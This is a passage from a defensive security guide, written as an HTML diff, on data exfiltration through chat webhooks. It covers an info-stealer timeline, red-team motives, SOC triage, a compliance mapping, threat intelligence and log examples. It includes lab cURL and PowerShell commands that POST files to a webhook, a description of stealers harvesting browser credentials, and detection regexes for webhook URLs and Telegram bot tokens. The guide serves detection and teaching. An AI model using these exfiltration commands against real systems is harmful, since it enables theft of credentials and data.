+          <li><strong>A fake installer.</strong> The user downloads a cracked-game installer from an untrusted download site. The file itself is not yet blocked; a file-reputation service later flags it in a retrospective verdict. <em>Defender:</em> a retrospective file-reputation flag lands in a queue that nobody has read yet. <em>Evidence:</em> <span class="mono">file reputation</span>.</li>
+          <li><strong>The stealer wakes up.</strong> The installer drops and starts a second, unsigned binary in <span class="mono">%TEMP%</span>. It runs silently in the user's own context — no UAC (user account control) prompt, no admin rights needed. <em>Defender:</em> EDR shows an unsigned binary in %TEMP% spawned by the installer. <em>Evidence:</em> <span class="mono">EDR binary event</span>.</li>
+          <li><strong>Collecting the harvest.</strong> The stealer reads the browser password store, the cookie database, saved chat-app login tokens, and wallet folders. Nothing is sent anywhere yet. <em>Defender:</em> EDR logs the process opening browser credential-store and cookie files — a rare access pattern for a normal app. <em>Evidence:</em> <span class="mono">browser-store file reads</span>.</li>
+          <li><strong>Packing.</strong> The stealer zips the loot into a small archive such as <span class="mono">log_WORKSTATION01.zip</span> in %TEMP%. <em>Defender:</em> an archive-create event appears right after the browser-file reads — the timing is the signal. <em>Evidence:</em> <span class="mono">ZIP create</span>.</li>
+          <li><strong>The webhook POST.</strong> The stealer sends one multipart POST to <span class="mono">https://discord.com/api/webhooks/&lt;id&gt;/&lt;token&gt;</span> (the ID and token shown here are fake). The connection is normal HTTPS to a trusted domain. <em>Defender:</em> DNS logs show a first-seen lookup of <span class="mono">discord.com</span> from a non-browser process, and the proxy logs a TLS (transport-layer security) SNI row. <em>Evidence:</em> <span class="mono">DNS first-seen</span>, <span class="mono">SNI/proxy row</span>.</li>
+          <li><strong>Files land in the attacker's channel.</strong> The webhook turns the POST into chat messages: <span class="mono">log.zip</span> plus a text file of credentials. The attacker reads them on a phone within minutes. <em>Defender:</em> nothing at all — no alert fires, because the data is already outside. This is the blind spot of the technique. <em>Evidence:</em> <span class="mono">no telemetry (data already gone)</span>.</li>
+          <li><strong>Abuse begins.</strong> The attacker replays a stolen session cookie and signs in to the victim's webmail from another country. <em>Defender:</em> the identity provider raises an impossible-travel sign-in alert — often the first loud signal, hours after the theft. <em>Evidence:</em> <span class="mono">impossible-travel alert</span>.</li>
+          <li><strong>SOC verdict.</strong> The analyst connects DNS first-seen → the process that resolved it → the %TEMP% archive and declares an info-stealer incident. The team blocks chat-API egress for workstations and starts a full credential reset. <em>Defender:</em> an egress policy is deployed and a password-manager rollout is scheduled. <em>Evidence:</em> <span class="mono">egress policy</span>.</li>
+        </ol>
+
+        <h4>What the nodes mean</h4>
+        <ul>
+          <li><strong>Attacker (channel owner)</strong> — the criminal who created the Discord server and the webhook, and who reads the stolen data in the channel.</li>
+          <li><strong>User PC (victim)</strong> — the workstation where the fake installer ran; it hosts the stealer process, the %TEMP% archive, and the browser stores being read.</li>
+          <li><strong>Discord API</strong> — the legitimate chat service; it receives the webhook POST and delivers files into the attacker's channel as normal messages.</li>
+          <li><strong>Mail / SaaS</strong> — the victim's cloud email; in step 7 the attacker signs in with a stolen session cookie.</li>
+          <li><strong>SOC (EDR · DNS · proxy)</strong> — the defenders' view: endpoint telemetry, resolver logs, and secure web gateway records, shown in the defender panel under the canvas.</li>
+        </ul>
+
+        <div class="callout practice">
+          <p><span class="callout-label">✓ Good practice.</span> Notice that steps 3–5 produce a tight time chain: browser-file reads → archive create → first-seen DNS → POST. Correlating those four events within a few minutes on one host is the single strongest detection story for this technique.</p>
+        </div>
+      </section>
+      <section id="sec-3-red-team" class="content-section">
+        <div class="section-head">
+          <span class="section-num">3</span>
+          <h2>Red Team / Hacker Perspective</h2>
+          <p class="section-intro">Why attackers pick webhooks, what they need first, and how a harmless lab version works.</p>
+        </div>
+
+        <h4>When, where, and why attackers use it</h4>
+        <p>Webhook exfiltration is attractive for simple reasons: it is free, fast, and hard to notice inside normal SaaS traffic. Public reporting has widely documented commodity info-stealer families using Discord webhooks and Telegram bots as their default drop point between 2021 and 2024, and the pattern continues today.</p>
+        <p>Where does it appear? On any host that can reach a chat API: user workstations running stealers, build runners shipping artifacts, servers moved by intruders, and SaaS or Office add-ins acting on their own. The timing follows the data. Stealers fire within minutes of infection. Ransomware groups upload small proof-of-data samples late in an intrusion, just before encryption. Insiders trickle files out slowly to avoid thresholds. The advantages from the attacker's point of view:</p>
+        <ul>
+          <li><strong>No server to buy or hide.</strong> A webhook URL is created in a minute inside a chat account, and the chat provider keeps it online. There is no attacker IP (internet address) to block, no domain to register, and no certificate to manage.</li>
+          <li><strong>Trusted destination.</strong> <span class="mono">discord.com</span>, <span class="mono">slack.com</span>, and <span class="mono">api.telegram.org</span> are high-reputation domains with valid TLS. Naive "block bad domains" lists never contain them.</li>
+          <li><strong>Files and text in one POST.</strong> A single multipart request can carry the ZIP archive plus a caption naming the victim machine, so the attacker can sort loot per victim.</li>
+          <li><strong>Read anywhere.</strong> The data appears as chat messages on the attacker's phone — no log in, no special tooling, perfect for quick resale of credentials.</li>
+        </ul>
+
+        <h4>Prerequisites</h4>
+        <p>The technique needs surprisingly little. From the victim side, only two things matter. First, the malware runs in a user context that may reach the internet. Second, egress to the chat API host is allowed by the network policy. From the attacker side, one chat account and one webhook URL (or a bot token for Telegram) are enough. That is the entire checklist — which is exactly why it works so often.</p>
+
+        <div class="callout danger">
+          <p><span class="callout-label">⚠ Danger — LAB-ONLY.</span> Never send data to a webhook you did not create yourself. In these examples the webhook belongs to a Discord or Slack workspace <em>you</em> made for testing, on machines <em>you</em> own, with sample files <em>you</em> wrote. Doing this against anyone else's systems or with real third-party data is illegal and unethical.</p>
+        </div>
+
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Lab test · cURL: post a file to your own webhook.</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-bash"># 1. Create a private test workspace and a webhook channel in it.
+# 2. Save that webhook URL in a shell variable — never paste a real
+#    token into scripts, screenshots, or shared notes:
+LAB_WEBHOOK_URL="<paste-your-own-webhook-url-here>"
+# 3. From your own lab VM, post a harmless sample file you wrote:
+curl -F "content=lab test from my own VM" \
+     -F "file=@sample.txt" \
+     "$LAB_WEBHOOK_URL"</code></pre>
+        </div>
+
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Lab test · PowerShell: the same POST from Windows.</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-powershell"># Still your own webhook, your own VM, your own sample file.
+$boundary = [System.Guid]::NewGuid().ToString()
+$form = @{ file = Get-Item .\sample.txt; content = "lab test" }
+Invoke-RestMethod -Method Post -Uri $env:LAB_WEBHOOK_URL -Form $form</code></pre>
+        </div>
+
+        <p>Both commands produce the exact traffic shape this guide detects: a POST whose URL contains <span class="mono">/api/webhooks/</span>, and a multipart body. Knowing the shape from the attacker side makes the regexes in section 5 obvious.</p>
+
+        <h4>Common variations</h4>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Variant</th><th>How it works</th><th>Where it shows up</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><strong>Telegram bot API</strong></td><td>The malware calls <span class="mono">sendMessage</span> for text or <span class="mono">sendDocument</span> for files, using a bot token in the URL path.</td><td>Commodity loaders and stealers; the token shape <span class="mono">digits:letters</span> is itself a detection clue.</td></tr>
+              <tr><td><strong>Slack incoming webhooks</strong></td><td>A POST to <span class="mono">hooks.slack.com/services/…</span> posts a message with attachments.</td><td>Attacker tooling and abused integrations; also real incidents such as Slack-channel exfiltration documented by ATT&amp;CK.</td></tr>
+              <tr><td><strong>Teams connectors / workflows</strong></td><td>Retired or restricted connectors still exist in some tenants and accept JSON (structured text) posts.</td><td>Older tooling and insider-style abuse in Microsoft-centric estates.</td></tr>
+              <tr><td><strong>Generic receivers</strong></td><td>Services like webhook.site give an instant "paste any data" URL.</td><td>Quick tests, worms such as the Shai-Hulud npm (JavaScript package registry) worm stealing repository secrets.</td></tr>
+              <tr><td><strong>Embedded in scripts/configs</strong></td><td>The webhook URL hides inside a batch script, CI (continuous integration) job, or app config rather than a binary.</td><td>Insider exfiltration and compromised build runners — the URL is greppable in logs.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h4>Mistakes attackers and their tooling make</h4>
+        <ul>
+          <li><strong>Hard-coding the webhook URL in clear text.</strong> The full URL sits in the binary, script, or command line. Any scanner, sandbox, or SIEM (security information and event management) rule that greps for <span class="mono">discord.com/api/webhooks/</span> finds the whole campaign at once.</li>
+          <li><strong>No cleanup of the temp ZIP.</strong> The archive stays in %TEMP% with victim-naming patterns like <span class="mono">log_HOSTNAME.zip</span>, giving responders a clean forensic artifact.</li>
+          <li><strong>Reusing one webhook across campaigns.</strong> Once that URL appears in one report, every future sample using it is linked — and providers can shut the channel down after disclosure.</li>
+        </ul>
+
+        <div class="callout note">
+          <p><span class="callout-label">🛈 Note — defender takeaway.</span> Every "advantage" above is also a detection opportunity. Free and stable means the URL persists in logs; trusted domains means first-seen DNS per host stands out; one POST means a single, well-shaped event to match on.</p>
+        </div>
+      </section>
+      <section id="sec-4-blue-team" class="content-section">
+        <div class="section-head">
+          <span class="section-num">4</span>
+          <h2>Blue Team / SOC Perspective</h2>
+          <p class="section-intro">What webhook exfiltration looks like in your telemetry, which artifacts it leaves behind, and a five-step triage flow you can follow.</p>
+        </div>
+
+        <p>From the defender's side, this technique is a story of <strong>almost-missing it</strong>. The POST itself is encrypted HTTPS to a trusted domain, so content inspection often sees nothing useful. What saves you are the <em>edges</em> of the event. One edge is a resolver question nobody asked before. Another is a process line that happens to contain a webhook URL. A third is a ZIP archive that appears seconds before the connection. None of those edges is loud on its own. Together, in a time chain on one host, they are one of the clearest detection stories in endpoint security.</p>
+
+        <h4>Artifacts left behind</h4>
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Artifact</th><th>Source</th><th>Why it matters</th></tr>
+            </thead>
+            <tbody>
+              <tr><td class="mono">discord.com, slack.com, api.telegram.org, hooks.slack.com queries</td><td>DNS / resolver logs</td><td>First-seen per host from a non-browser process is the classic stealer signal.</td></tr>
+              <tr><td class="mono">TLS SNI + destination + byte counts</td><td>Proxy / SWG (secure web gateway), firewall</td><td>Confirms real egress; small POSTs to chat APIs from servers are anomalous.</td></tr>
+              <tr><td class="mono">Command lines containing "webhook" or "discord.com/api/webhooks/"</td><td>EDR / Sysmon Event ID 1</td><td>The URL pattern is greppable; one hit often uncovers the whole campaign.</td></tr>
+              <tr><td class="mono">File-create → network-POST chain, small .zip in %TEMP%</td><td>EDR / Sysmon Event IDs 11 + 3</td><td>Archive staging immediately before egress is rare in normal software.</td></tr>
+              <tr><td class="mono">PowerShell 4104 script blocks with webhook URLs</td><td>Windows PowerShell logs</td><td>Catches script-based exfil that never touches disk as a binary.</td></tr>
+              <tr><td class="mono">Extension or SaaS audit events, CASB records</td><td>Browser, CASB, SaaS admin logs</td><td>Shows browser extensions and integrations posting to unexpected endpoints.</td></tr>
+              <tr><td class="mono">Impossible-travel sign-ins, new-device mailbox rules</td><td>Identity provider logs</td><td>Downstream abuse of stolen cookies and passwords — often the first loud alert.</td></tr>
+            </tbody>
+          </table>
+        </div>
+
+        <h4>Where to look first</h4>
+        <ul>
+          <li><strong>DNS layer:</strong> which hosts resolved chat API domains in the last 24 hours, and which process made the resolution? A workstation with a browser visit to Discord is normal; <span class="mono">svchost</span>, <span class="mono">curl</span>, or an unsigned exe doing it is not.</li>
+          <li><strong>Proxy layer:</strong> filter on the path pattern <span class="mono">/api/webhooks/</span> and on Telegram's <span class="mono">/bot&lt;token&gt;/</span> path. The domain alone is noisy; the path is much tighter.</li>
+          <li><strong>Endpoint layer:</strong> chain file events and network events per process. A process that wrote an archive and, within a minute, opened a connection to a chat API deserves an incident ticket, not a glance.</li>
+          <li><strong>Identity layer:</strong> for any confirmed stealer, treat every browser-saved password and cookie as compromised and check for sign-in abuse immediately.</li>
+        </ul>
+
+        <h4>Why it matters for the whole chain</h4>
+        <p>Catching T1567.004 late is still catching it. The exfil event tells you code execution happened, collection happened, and — for stealer families — that credentials and cookies are now stolen goods. That single detection triggers identity response, password resets, session revocation, and estate-wide hunting. Missing it usually means the first alert arrives days later from a fraud report or an impossible-travel event, when the data has already been sold.</p>
+
+        <h4>Triage flow</h4>
+        <ol>
+          <li><strong>DNS first-seen.</strong> Confirm the host queried a chat API domain for the first time recently. Check whether a browser did it (benign) or another process (interesting).</li>
+          <li><strong>Identify the process.</strong> Pull the EDR process tree for the resolving process: image path, hash, signer, parent. Unsigned binaries in %TEMP% or user-writable folders are the red flag.</li>
+          <li><strong>Look for the temp archive.</strong> Search file events for ZIPs created by that process in the minutes before the POST. Capture one sample (in a safe location) for the report.</li>
+          <li><strong>Scope the credential reset.</strong> If it is an info stealer, assume all browser-saved passwords, cookies, and tokens on that host are stolen. Start resets from a clean device — never from the infected one.</li>
+          <li><strong>Block and hunt estate-wide.</strong> Block chat-API egress for workstations per policy, then hunt the URL pattern (for example <span class="mono">discord.com/api/webhooks/</span>) across DNS, proxy, EDR, and script logs for the whole environment.</li>
+        </ol>
+
+        <div class="callout practice">
+          <p><span class="callout-label">✓ Good practice.</span> Write the triage flow into your incident-response plan <em>before</em> an incident. During a live stealer event, a team that has practiced this flow saves hours and resets the right accounts first. The flow is: DNS first-seen → process → archive → reset scope → block + hunt.</p>
+        </div>
+      </section>
+      <section id="sec-5-detection" class="content-section">
+        <div class="section-head">
+          <span class="section-num">5</span>
+          <h2>Detection Engineering Deep Dive</h2>
+          <p class="section-intro">The practical heart of this guide: regulation mapping, threat intelligence, ranked threats, the logs that expose them, and ready-to-adapt Sigma and Splunk rules.</p>
+        </div>
+
+        <p>Detection for webhook exfiltration stands on three pillars. First, <strong>know your normal egress</strong> — which hosts may talk to which chat APIs. Second, <strong>log the edges</strong> — DNS, SNI, process lines, script blocks, and file events. Third, <strong>match the URL shape</strong> — webhook paths and token patterns that normal chat browsing never produces. Everything below serves those three ideas. If you only take one thing away: <em>the domain is not the detection — the combination of process, path, and first-seen behavior is.</em></p>
+
+        <h3 id="sec-5-1-regulation">5.1 Regulation mapping</h3>
+        <p>You may be asked why the SOC monitors chat-API egress at all. The frameworks below either require protecting data in transit and at rest, or require monitoring and incident response — webhook exfiltration sits exactly on that overlap. Use the "Expected evidence" column to know what an auditor may ask you to produce. Examples: a policy document, a device-control or DLP (data loss prevention) configuration export, alert tickets, or audit logs. For readers new to the names: GDPR is the EU data-protection law. HIPAA is the US health-information law. PCI DSS is the payment-card industry standard. ISO/IEC 27001 is the international security-management standard. NIST SP 800-53 is a US federal control catalog.</p>
+
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Framework</th><th>Control</th><th>Why it applies</th><th>Expected evidence</th></tr>
+            </thead>
+            <tbody>
+              <tr><td><strong>GDPR</strong></td><td class="mono">Art. 32(1) security of processing; Art. 5(1)(f) confidentiality &amp; integrity; Art. 33/34 breach notification</td><td>Personal data leaving through a webhook is a confidentiality failure; Art. 33/34 clock starts when you detect it, so detection quality directly shapes notification.</td><td>Egress policy for chat APIs, DLP/web filtering config, incident tickets with timelines, breach-notification records.</td></tr>
+              <tr><td><strong>HIPAA Security Rule</strong></td><td class="mono">164.308(a)(1)(ii)(D) information-system activity review; 164.312(b) audit controls; 164.312(e) transmission security; 164.310(d) device &amp; media controls</td><td>Regular review of system activity and protection of data in transit are explicit; ePHI (electronic protected health information) posted to a webhook violates transmission security.</td><td>Log-review schedules and findings, audit-log retention proof, encryption-in-transit settings, media/device policy documents.</td></tr>
+              <tr><td><strong>ISO/IEC 27001:2022 Annex A</strong> ⭐</td><td class="mono">A.8.12 data leakage prevention; A.5.14 information transfer; A.7.9 assets off-premises; A.8.1 user endpoint devices; A.8.16 monitoring activities</td><td>The most on-point rows: A.8.12 expects controls against data leaving via web channels, A.5.14 covers transfer rules, A.8.16 requires monitoring that would surface webhook POSTs.</td><td>DLP rule export, transfer-policy document, endpoint hardening baseline, monitoring coverage list, alert tickets.</td></tr>
+              <tr><td><strong>SOC 2 (TSC — trust services criteria)</strong> ⭐</td><td class="mono">CC6.1 logical access; CC6.7 restrict movement/transmission of data; CC7.2 monitoring; CC7.3 incident evaluation</td><td>CC6.7 is literally about restricting where data can be transmitted — an egress policy for chat APIs is a textbook implementation; CC7.2/7.3 expect you to detect and evaluate exfil events.</td><td>Trust-services mapping, egress rule change tickets, monitoring dashboards, incident post-mortems.</td></tr>
+              <tr><td><strong>PCI DSS v4.0</strong></td><td class="mono">Req. 12.3.x technology acceptable-use and media-handling policies (verify current sub-numbering); Req. 4 protection of account data in transit</td><td>Cardholder data posted to a webhook breaks Req. 4; acceptable-use policies should name chat/file-drop channels for systems in scope.</td><td>Policy documents naming web channels, segment/egress diagrams, ASV and internal scan results, incident-response procedures.</td></tr>
+              <tr><td><strong>NIST SP 800-53 Rev.5</strong> ⭐</td><td class="mono">MP-7 Media Use; MP-6 Media Sanitization; SI-4 System Monitoring; AC-4 Information Flow Enforcement</td><td>AC-4 and SI-4 carry the weight here: enforcing approved information flows and monitoring for them is exactly first-seen + webhook-pattern detection.</td><td>Flow-control policy, SIEM content list, monitoring procedures, sanitization and media-use records.</td></tr>
+              <tr><td><strong>NIST CSF 2.0</strong></td><td class="mono">PR.DS data security; DE.CM continuous monitoring</td><td>PR.DS covers protecting data in transit from unauthorized disclosure; DE.CM expects monitoring of networks and endpoints that catches the POST.</td><td>CSF profile worksheet, DE.CM telemetry inventory, detected-example tickets.</td></tr>
+            </tbody>
+          </table>
+        </div>
+        <p class="mini-note">⭐ = rows most relevant to this technique. Framework text is summarized; always work from the official publication for audits.</p>
+
+        <h3 id="sec-5-2-intel">5.2 Threat intelligence</h3>
+        <p>Good detections start from reported reality. <strong>Collection</strong> means pulling fresh reporting into one place. <strong>Analysis</strong> means asking: which chat services, which URL shapes, which processes, which file names? <strong>Application</strong> means turning those answers into allow-lists, first-seen baselines, and the regexes you will see in 5.5. Intel that never reaches a rule or a policy is decoration.</p>
+        <p>Useful collection sources: the MITRE ATT&amp;CK site and its STIX/TAXII (standard threat-intelligence exchange formats) feeds. Vendor blogs: Microsoft, Mandiant, CrowdStrike, ESET, Kaspersky, Red Canary. OSINT (open-source intelligence) repositories: abuse.ch, Any.run, malware-traffic-analysis.net, vx-underground. Commercial feeds: Recorded Future, VirusTotal. Sector ISACs (information sharing and analysis centers): MS-ISAC, FS-ISAC, H-ISAC, E-ISAC, or ICS-ISAC as relevant. And your own internal telemetry — past incidents, honeypots, and EDR history.</p>
+
+        <h4>Known actors and campaigns</h4>
+        <p>Confidence levels here mean: <span class="badge conf-high">High</span> = the pattern is confirmed by multiple independent sources and/or official ATT&amp;CK entries. <span class="badge conf-medium">Medium</span> = reported by reputable vendors but with fewer sources or attribution caveats. <span class="badge conf-low">Low</span> = single-source or unverified reporting. Note the difference between <em>pattern-level</em> confidence (the technique usage is documented) and <em>per-sample attribution</em> (this exact binary belongs to this exact actor), which is usually weaker. In the table, C-numbers are ATT&amp;CK campaign IDs and S-numbers are ATT&amp;CK software IDs. "Listed on the ATT&amp;CK page" means the entry appears in the procedure-examples table of the official T1567.004 page today. Every other row is a public-reporting claim, kept separate on purpose.</p>
+
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>Actor / campaign</th><th>Confidence</th><th>What is reported</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td><strong>Discord-webhook info stealers</strong> (2021–2024 waves; AnarchyGrabber-style token grabbers; RedLine-era stealer families)</td>
+                <td><span class="badge conf-high">High</span> <span class="mini-note">pattern-level</span><br><span class="badge conf-medium">Medium</span> <span class="mini-note">per-sample attribution</span></td>
+                <td>Public reporting has widely documented stealer families harvesting browser credentials, cookies, and chat tokens and posting the loot to attacker-created Discord webhooks. Attribution of individual samples varies; the pattern itself is extremely well established.</td>
+              </tr>
+              <tr>
+                <td><strong>Telegram bot exfiltration</strong> by commodity stealers and loaders</td>
+                <td><span class="badge conf-high">High</span> <span class="mini-note">pattern-level</span></td>
+                <td>Many commodity families report infections and ship stolen files via the Telegram bot API (<span class="mono">sendMessage</span> / <span class="mono">sendDocument</span>), using a bot token in the URL path.</td>
+              </tr>
+              <tr>
+                <td><strong>Shai-Hulud npm worm</strong></td>
+                <td><span class="badge conf-high">High</span> <span class="mini-note">official ATT&amp;CK example</span></td>
+                <td>Listed on the official ATT&amp;CK page for this technique (S9008): the worm exfiltrated repository secrets to a generic webhook receiver (webhook[.]site) from compromised build environments.</td>
+              </tr>
+              <tr>
+                <td><strong>Lapsus$ / DEV-0537-style activity</strong></td>
+                <td><span class="badge conf-medium">Medium</span> <span class="mini-note">vendor reporting</span></td>
+                <td>Vendor reporting describes this extortion group using Telegram for coordination and for moving stolen data, alongside its better-known social-engineering intrusions.</td>
+              </tr>
+              <tr>
+                <td><strong>CHOPCHOP / IncrediLoad-style loaders</strong></td>
+                <td><span class="badge conf-medium">Medium</span> <span class="mini-note">vendor reporting</span></td>
+                <td>Vendor-reported toolsets that use Discord (and similar chat infrastructure) both for staging second-stage payloads and for exfiltrating results.</td>
+              </tr>
+              <tr>
+                <td><strong>2025 Poland Wiper Attacks</strong></td>
+                <td><span class="badge conf-high">High</span> <span class="mini-note">official ATT&amp;CK example</span></td>
+                <td>Listed on the official ATT&amp;CK page for this technique (C0063): adversaries leveraged an attacker-controlled Slack channel to exfiltrate data during the wiper campaign.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout note">
+          <p><span class="callout-label">🛈 Note — how to use this table.</span> You do not need to agree with every attribution. For detection, the pattern rows matter most: they tell you which URL shapes and process behaviors are worth a rule today. Attribution is for threat-intel reports; behavior is for your SIEM.</p>
+        </div>
+        <h3 id="sec-5-3-threats">5.3 Threats ranking and categorization</h3>
+        <p>Six concrete threats use this technique. They are ranked by severity: how much damage a successful case does, how common the pattern is, and how hard it is to detect. The official ATT&amp;CK platform list for T1567.004 is "ESXi, Linux, Office Suite, SaaS, Windows, macOS". The badges below map onto it. ESXi covers virtualization and build hosts (threat 3). SaaS covers tenant-side abuse such as webmail and workspace content (threat 5). The desktop operating systems cover the endpoint threats. Office Suite fits the same tenant-side pattern as SaaS — malicious add-ins and workload scripts posting to webhooks. Every threat below gets its own log analysis in 5.4 and its own Sigma rule plus Splunk query in 5.5.</p>
+
+        <div class="table-wrap">
+          <table>
+            <thead>
+              <tr><th>#</th><th>Threat</th><th>Severity</th><th>Platform</th><th>Description &amp; preconditions</th><th>Impact</th><th>Rating justification</th></tr>
+            </thead>
+            <tbody>
+              <tr>
+                <td>1</td>
+                <td><strong>Info stealer sends browser credentials and cookies via Discord webhook</strong></td>
+                <td><span class="badge sev-critical">Critical</span></td>
+                <td><span class="badge cat-windows">Windows</span> <span class="badge cat-macos">macOS</span></td>
+                <td>Malware running as the user reads browser password stores, cookies, and tokens, zips them, and POSTs them to an attacker webhook. <em>Precondition:</em> user executes the stealer (malvertising, cracked software, fake updates).</td>
+                <td>Mass credential theft; session hijack; account takeover; resale of access.</td>
+                <td>Dominant consumer-grade pattern for years; the data loss is immediate and the victim count scales with every download.</td>
+              </tr>
+              <tr>
+                <td>2</td>
+                <td><strong>Loader or bot reports to Telegram bot API</strong></td>
+                <td><span class="badge sev-high">High</span></td>
+                <td><span class="badge cat-windows">Windows</span></td>
+                <td>A loader or stealer uses a Telegram bot (<span class="mono">sendMessage</span>/<span class="mono">sendDocument</span>) to report infection and ship stolen files to the operator. <em>Precondition:</em> infection plus allowed egress to <span class="mono">api.telegram.org</span>.</td>
+                <td>Stolen files and logs reach the operator; new victims mapped automatically.</td>
+                <td>Chat APIs are trusted by most orgs, so this blend of command-and-control and exfiltration hides inside "known good" lists.</td>
+              </tr>
+              <tr>
+                <td>3</td>
+                <td><strong>Compromised CI posts artifacts to an attacker webhook</strong></td>
+                <td><span class="badge sev-high">High</span></td>
+                <td><span class="badge cat-linux">Linux</span> <span class="badge cat-cloud">Cloud</span> <span class="badge cat-network">ESXi</span></td>
+                <td>A build runner or pipeline is compromised (typosquat dependency, injected step) and posts secrets, tokens, or artifacts to an external webhook. <em>Precondition:</em> runner compromise or dependency compromise.</td>
+                <td>Source code, cloud keys, and signing secrets leak; supply-chain follow-on attacks.</td>
+                <td>Runners already talk to many APIs, so one more POST is invisible unless egress is allow-listed; the Shai-Hulud worm made this pattern famous.</td>
+              </tr>
+              <tr>
+                <td>4</td>
+                <td><strong>Insider script exfiltrates files to a private webhook</strong></td>
+                <td><span class="badge sev-high">High</span></td>
+                <td><span class="badge cat-windows">Windows</span> <span class="badge cat-macos">macOS</span> <span class="badge cat-linux">Linux</span></td>
+                <td>An employee or contractor uses PowerShell, bash, or Python to push small batches of files to a personal webhook receiver. <em>Precondition:</em> legitimate data access plus intent.</td>
+                <td>Quiet theft of customer lists, source code, or pricing data in small pieces.</td>
+                <td>Looks like ordinary integration traffic in tiny volumes; no malware at all, so endpoint alerts never fire.</td>
+              </tr>
+              <tr>
+                <td>5</td>
+                <td><strong>Malicious browser extension posts tab content to a webhook</strong></td>
+                <td><span class="badge sev-medium">Medium</span></td>
+                <td><span class="badge cat-windows">Windows</span> <span class="badge cat-macos">macOS</span> <span class="badge cat-cloud">SaaS</span></td>
+                <td>An installed extension (or one that turned malicious in an update) exfiltrates page content, form input, or cookies to a webhook. <em>Precondition:</em> user installs the extension and grants permissions.</td>
+                <td>Browsing-data theft, webmail and intranet content leakage, session tokens.</td>
+                <td>Extension permissions are often ignored during install, and browser traffic blends in — but volume and egress-per-extension rules catch it.</td>
+              </tr>
+              <tr>
+                <td>6</td>
+                <td><strong>Ransomware pre-encryption exfiltration via webhook API</strong></td>
+                <td><span class="badge sev-high">High</span></td>
+                <td><span class="badge cat-windows">Windows</span> <span class="badge cat-linux">Linux</span></td>
+                <td>Before encryption, the intruder uploads a proof-of-data sample (small archive or database slice) through a chat webhook API to support double extortion. <em>Precondition:</em> established intrusion with data access.</td>
+                <td>Proof-of-data upload; leverage for extortion; early indicator of imminent encryption.</td>
+                <td>Small "sample" POSTs precede the big event, so catching them gives you a chance to stop encryption entirely.</td>
+              </tr>
+            </tbody>
+          </table>
+        </div>
+
+        <div class="callout warning">
+          <p><span class="callout-label">⚠ Warning — ranking is context.</span> Severity here assumes a typical enterprise. In a software company, threat 3 may outrank threat 1; in a law firm, threat 4. Re-rank these for your own estate during detection-engineering reviews.</p>
+        </div>
+        <h3 id="sec-5-4-logs">5.4 Logs and patterns</h3>
+        <p>Each threat below lists its best log sources with key fields, contrasts normal with suspicious behavior, states the detection logic in one sentence, and shows a realistic event example. Field names vary by vendor — the examples use common schemas (Sysmon's XML (extensible markup language) format, typical proxy/DNS JSON) so you can map them to your own pipelines. Every URL, ID, and token-like value in these examples is a placeholder — nothing on this page is a real channel, bot, workspace, or secret.</p>
+
+        <h4>Threat 1 · Info stealer → Discord webhook (credentials and cookies)</h4>
+        <p><strong>Log sources and key fields:</strong> DNS/resolver logs (<span class="mono">clientIp, queryHostname, queryType, processImage</span> if enriched by EDR). Sysmon Event ID 1 (<span class="mono">Image, CommandLine, ParentImage, Hashes</span>). Sysmon Event ID 11 (<span class="mono">TargetFilename, Image</span>). Sysmon Event ID 3 (<span class="mono">DestinationHostname, DestinationPort, ProcessGuid</span>). Proxy/SWG logs (<span class="mono">r-dns, c-uri-path, bytes</span>).</p>
+        <p><strong>Normal behavior:</strong> browsers and update agents resolve <span class="mono">discord.com</span> or <span class="mono">slack.com</span>; a handful of known processes do so on predictable schedules. <strong>Suspicious behavior:</strong> a first-seen resolution for the host comes from a non-browser, unsigned, or %TEMP%-located process. It is followed within minutes by an archive write and a POST.</p>
+        <p><strong>Detection logic:</strong> alert when a host's <em>first-ever</em> DNS resolution of a chat API domain originates from a non-browser process. Also alert when a process command line matches the webhook URL pattern <span class="mono">discord\.com/api/webhooks/[0-9]+/[\w-]+</span>, especially within 10 minutes of a ZIP creation by the same process.</p>
+
+        <div class="code-block">
+          <div class="code-head"><span class="code-title">Example · DNS query log (JSON, enriched)</span><button class="copy-btn" type="button">Copy</button></div>
+          <pre><code class="language-json">{
+  "ts": "2025-04-17T09:41:22.118Z",
+  "clientIp": "10.22.7.41",
+  "hostname": "FIN-WS-0341",
+  "query": "discord.com",
+  "queryType": "A",
+  "answer": ["162.159.135.232"],
+  "firstSeenForClient": true,
+  "process": {
+    "image": "C:\\Users\\jmalone\\AppData\\Local\\Temp\\log_helper.exe",
+    "pid": 7412,
+    "signed": false
+  },
+  "responseCode": "NOERROR"
+}</code></pre>
+        </div>
+        <ul>
+          <li><span class="mono">firstSeenForClient: true</span> — this host never resolved discord.com before; the SIEM built this flag from 30 days of history.</li>
+          <li><span class="mono">process.image</span> — an unsigned binary in %TEMP%; browsers never resolve from this path.</li>
+          <li><span class="mono">hostname</span> — the workstation identity; join it to the EDR process tree next.</li>
+          <li><span class="mono">ts</span> — the timestamp anchors the chain: expect archive-create and proxy POST events within ±3 minutes.</li>
+        </ul>
+
+        <h4>Threat 2 · Loader/bot → Telegram bot API</h4>
+        <p><strong>Log sources and key fields:</strong> Sysmon Event ID 1 (<span class="mono">CommandLine, Image, ParentImage</span>). Proxy logs (<span class="mono">urlHost, c-uri-path, requestMethod, bytesOut</span>). EDR network events (<span class="mono">DestinationHostname, ProcessId</span>).</p>
+        <p><strong>Normal behavior:</strong> almost none from servers; from workstations, only approved messaging apps resolve <span class="mono">api.telegram.org</span>. <strong>Suspicious behavior:</strong> curl, PowerShell, or an unsigned binary touching <span class="mono">/bot</span> paths. Also a command line containing a token-shaped string <span class="mono">[0-9]{8,10}:[\w-]{30,}</span> — a bot token looks like a number, a colon, then a long alphanumeric string. Treat the shape as sensitive, exactly like a password.</p>
